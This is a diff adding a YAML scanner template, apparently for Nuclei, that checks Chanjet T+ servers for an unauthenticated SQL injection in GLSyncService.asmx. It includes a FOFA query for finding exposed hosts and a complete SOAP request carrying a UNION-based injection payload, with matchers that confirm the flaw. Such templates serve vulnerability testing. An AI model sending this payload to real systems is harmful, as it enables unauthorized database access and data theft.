@@ -1,0 +1,39 @@
+id: changjietong-GLSyncService_asmx-sql
+
+info:
+  name: "畅捷通T+ GLSyncService.asmx接口存在SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="畅捷通-TPlus"
+      畅捷通T+系统GLSyncService.asmx接口在输入验证机制上存在设计缺陷，导致未经身份验证的攻击者可通过构造恶意SQL语句实施注入攻击。该漏洞允许攻击者直接访问底层数据库，可能造成敏感数据泄露（如管理员凭证、用户隐私信息）等安全风险。在具备高权限访问条件下，攻击者还可通过注入链式操作向目标服务器写入恶意代码，最终实现对服务器的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s/oy7_HbFRjqpURDweiTEt2A
+  tags: 畅捷通T+
+
+http:
+- raw:
+  - |
+    POST /tplus/GLSyncService.asmx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://www.chanjet.com/GetSourceAccountDataTable"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <GetSourceAccountDataTable xmlns="http://www.chanjet.com/">
+          <versionType>' UNION ALL SELECT NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>
+        </GetSourceAccountDataTable>
+      </soap:Body>
+    </soap:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '转换成数据类型 int 时失败'
+  - type: status
+    status:
+    - 500
